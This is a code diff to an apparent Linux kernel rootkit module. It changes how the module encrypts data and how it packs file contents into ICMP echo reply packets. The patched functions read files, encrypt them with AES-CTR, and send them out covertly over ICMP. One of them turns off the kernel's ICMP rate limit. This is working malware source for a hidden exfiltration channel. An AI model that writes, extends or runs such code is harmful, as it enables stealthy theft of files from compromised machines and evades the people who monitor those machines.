@@ -43,6 +43,7 @@
 #include <crypto/ctr.h>
 //#include "fs/proc/internal.h"
 #include "ftrace_hook.h"
+#include "aes.h"
 
 
 #define FIRST_PROCESS_ENTRY 256
@@ -1797,7 +1798,7 @@ static struct task_struct *event_kthread = NULL;
 static DECLARE_WAIT_QUEUE_HEAD(exec_event_wait);
 
 static DEFINE_MUTEX(mutex_tfm);
-static struct crypto_skcipher *tfm = NULL;
+//static struct crypto_skcipher *tfm = NULL;
 
 static void free_exec_event(struct exec_event *ev)
 {
@@ -1874,6 +1875,7 @@ static __attribute__((unused)) int update_secret_succ(void)
 	return 0;
 }
 
+#if 0
 static int enc_dec_buf(char *dst, char *src, int len, int cmd, const char *key, int key_len)
 {
 	struct skcipher_request *req = NULL;
@@ -1938,6 +1940,18 @@ out:
 		skcipher_request_free(req);
 	return err;
 }
+#endif
+
+static int enc_dec_buf(char *dst, char *src, int len, int cmd, const char *key, int key_len)
+{
+	if (cmd == CMD_ENCRYPT) {
+		aes_encrypt_ctr(src, len, key, key_len);
+	} else if (cmd == CMD_DECRYPT) {
+		aes_decrypt_ctr(src, len, key, key_len);
+	}
+	return 0;
+}
+
 
 static int enc_buf(char *dst, char *src, int len)
 {
@@ -2107,13 +2121,14 @@ static int do_send_file(const char *fname, int f_len, struct sk_buff *skb, char 
 	char *cmd = NULL;
 	char *name = NULL;
 	void *data = NULL;
+	char *ptr = NULL;
 	loff_t file_size = 0;
 	loff_t size = 0;
 	int len = 0;
 	int rc = -1;
 	unsigned short seq = 0; 
 
-	if (!fname || f_len <= 0 || !skb || !buf || buf_len <= 0)
+	if (!fname || f_len <= 0 || !skb || !buf || buf_len <= sizeof(int))
 		goto end;
 
 	name = kstrdup(fname, GFP_KERNEL);
@@ -2134,14 +2149,31 @@ static int do_send_file(const char *fname, int f_len, struct sk_buff *skb, char 
 
 	disable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
 	while (file_size > 0) {
-		len = file_size > buf_len ? buf_len : file_size;
+		/*
+		  format: CMD + filename + '\0' + datalen + data
+		*/
+		len = file_size > buf_len-sizeof(int) ? buf_len-sizeof(int) : file_size;
 
-		*((short*)cmd) = htons(CMD_SEND_FILE);
-		memcpy(cmd+LEN_PREFIX_CMD, name, f_len);
-		cmd[LEN_PREFIX_CMD+f_len] = '\0';
-		memcpy(cmd+LEN_PREFIX_CMD+f_len+1, data+size, len);
+		ptr = cmd;
+		*((short*)ptr) = htons(CMD_SEND_FILE);
+		ptr += sizeof(short);
 
-		enc_buf(cmd, cmd, len+LEN_PREFIX_CMD+f_len+1);
+		memcpy(ptr, name, f_len);
+		ptr += f_len;
+
+		*ptr = '\0';
+		ptr++;
+
+		*(int*)(ptr) = htonl(len);
+		ptr += sizeof(int);
+
+		memcpy(ptr, data+size, len);
+		ptr += len;
+
+		if ((char *)icmph + skb2->len - ptr > 0)
+			memset(ptr, 0, (char *)icmph + skb2->len - ptr);
+
+		enc_buf(cmd, cmd, skb2->len - sizeof(struct icmphdr) - sizeof(struct timeval));
 
 		while (!icmp_ratelimit(&icmp_rs, len)) 
 			schedule_timeout_interruptible(3);
@@ -2189,18 +2221,23 @@ static int do_send_file_size(const char *name, int f_len, struct sk_buff *skb, c
 	char *ptr = NULL;
 	int rc = -1;
 
-	if (!name || f_len <= 0 || buf_len < sizeof(file_size))
+	if (!name || f_len <= 0 || buf_len < sizeof(file_size) + sizeof(int))
 		goto end;
 
 	file_size = get_file_size(name);
 	if (file_size < 0)
 		goto end;
 
-	file_size = htonl(file_size);
-	memcpy(buf, (void*)&file_size, sizeof(file_size));
+	/*
+	 * format: CMD + filename + '\0' + datalen + data
+	 */
 
-	ptr = buf-f_len-1-LEN_PREFIX_CMD;
-	enc_buf(ptr, ptr, buf_len+f_len+1+LEN_PREFIX_CMD);
+	*(int*)buf = sizeof(int);
+	file_size = htonl(file_size);
+	memcpy(buf+sizeof(int), (void*)&file_size, sizeof(file_size));
+
+	ptr = buf - 1 - f_len - LEN_PREFIX_CMD;
+	enc_buf(ptr, ptr, buf_len + 1 + f_len + LEN_PREFIX_CMD);
 
 	disable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
 	real_icmp_echo(skb);
